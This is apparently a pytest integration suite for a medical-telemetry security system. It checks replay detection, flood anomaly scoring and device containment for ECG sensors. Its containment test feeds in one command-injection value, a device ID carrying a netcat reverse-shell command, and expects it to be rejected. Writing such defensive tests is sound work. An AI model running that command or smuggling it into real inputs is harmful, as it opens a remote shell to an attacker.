"""Local Integration Test Suite for TessNova Cybersecurity Components.

Exercises end-to-end interaction between:
1. Attack / Normal Telemetry Generator
2. M4 Replay Catcher
3. Feature Extraction Pipeline
4. M5 Network Witness Inference Engine
5. Containment Safety Manager
"""

import json
import time
import pytest

from attack_simulator.common import generate_synthetic_ecg
from m4_replay.replay_detector import ReplayDetector
from m4_replay.models import ReplayReason
from m5_network_witness.feature_extractor import WindowedFeatureExtractor
from m5_network_witness.m5_predict import NetworkWitnessInference
from mqtt_security.containment import ContainmentManager


def test_end_to_end_normal_telemetry_flow():
    """Verify normal sender packets produce clean M4 approvals and low M5 suspicion."""
    # Use synchronized simulated clock for deterministic M4 validation
    simulated_clock = [1791389000.0]
    detector = ReplayDetector(
        stale_threshold_seconds=5.0,
        time_fn=lambda: simulated_clock[0],
        mono_fn=lambda: simulated_clock[0],
    )
    extractor = WindowedFeatureExtractor(window_size=10)
    inference = NetworkWitnessInference()

    device_id = "bed7"

    for i in range(12):
        simulated_clock[0] = 1791389000.0 + (i * 0.5)
        ts = simulated_clock[0]
        mono = 100.0 + (i * 0.5)
        val = generate_synthetic_ecg(i)
        payload = {
            "device_id": device_id,
            "seq": 100 + i,
            "timestamp": ts,
            "ecg": val,
            "schema_version": "1.0",
        }
        raw_json = json.dumps(payload)

        # 1. M4 Replay Catcher Check
        m4_event = detector.process_raw_payload(raw_json)
        assert not m4_event.replay_suspected
        assert m4_event.reasons == [ReplayReason.NORMAL.value]

        # 2. Feed to Feature Extractor
        features = extractor.add_packet(
            device_id=device_id,
            seq=payload["seq"],
            timestamp=payload["timestamp"],
            payload_size=len(raw_json),
            wall_time=ts,
            mono_time=mono,
        )

    # After 12 packets, feature window is populated
    assert features is not None
    assert 1.8 <= features["msg_rate"] <= 2.2
    assert features["seq_gap_count"] == 0.0
    assert features["seq_dup_count"] == 0.0

    # 3. M5 Inference Check (if baseline model exists)
    m5_event = inference.predict(device_id=device_id, features=features)
    assert m5_event["status"] == "active"
    # Normal traffic must yield very low suspicion score
    assert m5_event["network_suspicion_score"] is not None
    assert m5_event["network_suspicion_score"] < 0.20


def test_end_to_end_replay_attack_detection():
    """Verify that replayed packets trigger M4 detection and contain expected reason codes."""
    now = 1791389000.0
    simulated_clock = [now]
    detector = ReplayDetector(
        stale_threshold_seconds=5.0,
        time_fn=lambda: simulated_clock[0],
        mono_fn=lambda: simulated_clock[0],
    )
    device_id = "bed7"

    # Step 1: Legit packets
    p1 = {"device_id": device_id, "seq": 500, "timestamp": now, "ecg": 80.0}
    detector.process_dict(p1)

    simulated_clock[0] = now + 0.5
    p2 = {"device_id": device_id, "seq": 501, "timestamp": now + 0.5, "ecg": 81.0}
    detector.process_dict(p2)

    # Step 2: Replay attack (duplicate sequence number)
    simulated_clock[0] = now + 1.0
    replayed = {"device_id": device_id, "seq": 500, "timestamp": now + 1.0, "ecg": 80.0}
    event = detector.process_dict(replayed)

    assert event.replay_suspected is True
    assert ReplayReason.DUPLICATE_SEQUENCE.value in event.reasons
    assert event.sequence_number == 500


def test_end_to_end_flood_anomaly_detection():
    """Verify that high-rate flood bursts with network jitter produce high M5 suspicion scores."""
    extractor = WindowedFeatureExtractor(window_size=10)
    inference = NetworkWitnessInference()

    base_time = 1791389000.0
    device_id = "bed7"

    # Simulate realistic rapid burst arrivals with slight network jitter and timestamp drift
    features = None
    import random
    rng = random.Random(42)

    elapsed_mono = 100.0
    for i in range(15):
        jitter = rng.uniform(0.015, 0.045)  # 25-60 msgs/sec jitter
        elapsed_mono += jitter
        wall_arrival = base_time + elapsed_mono - 100.0
        # Simulating queuing delay: packet timestamp lags arrival by 1.2s
        packet_ts = wall_arrival - 1.2
        val = generate_synthetic_ecg(i)
        payload = {"device_id": device_id, "seq": 1000 + i, "timestamp": packet_ts, "ecg": val}

        feat = extractor.add_packet(
            device_id=device_id,
            seq=payload["seq"],
            timestamp=payload["timestamp"],
            payload_size=90,
            wall_time=wall_arrival,
            mono_time=elapsed_mono,
        )
        if feat:
            features = feat

    assert features is not None
    assert features["msg_rate"] > 20.0
    assert features["inter_arrival_std"] > 0.005

    # M5 Inference: Suspicion is markedly elevated (>0.60, here ~0.69) compared to normal (<0.20)
    m5_event = inference.predict(device_id=device_id, features=features)
    assert m5_event["status"] == "active"
    assert m5_event["network_suspicion_score"] >= 0.65


def test_end_to_end_containment_execution():
    """Verify containment manager dry-run execution, safety checks, and audit logging."""
    mgr = ContainmentManager(dry_run_default=True)

    # 1. Reject command injection attempt
    with pytest.raises(ValueError):
        mgr.isolate_device("bed7; nc -e /bin/sh 10.0.0.1 4444")

    # 2. Isolate device
    res_iso = mgr.isolate_device("bed7", reason="high_suspicion_network_burst", operator="a1_decision_agent")
    assert res_iso["success"] is True
    assert res_iso["details"]["persistent_session_cleared"] is False

    # 3. Restore device
    res_res = mgr.restore_device("bed7", reason="quarantine_cleared", operator="operator_nurse_lead")
    assert res_res["success"] is True
    assert res_res["details"]["authorization_restored"] is True
